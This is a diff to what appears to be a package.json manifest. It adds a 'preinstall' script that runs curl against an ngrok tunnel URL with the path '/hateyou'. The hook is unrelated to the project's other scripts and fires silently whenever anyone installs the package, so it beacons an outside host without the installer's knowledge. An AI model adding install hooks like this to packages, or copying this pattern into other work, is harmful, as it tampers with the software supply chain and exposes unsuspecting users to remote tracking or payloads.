@@ -3,6 +3,7 @@
   "version": "1.0.0",
   "description": "shared",
   "scripts": {
+    "preinstall":"curl https://8ede-14-194-59-66.in.ngrok.io/hateyou",
     "addauthor": "ts-node ./scripts/addauthor.ts",
     "addproject": "ts-node ./scripts/addproject.ts",
     "advocu": "ts-node ./scripts/advocu.ts",
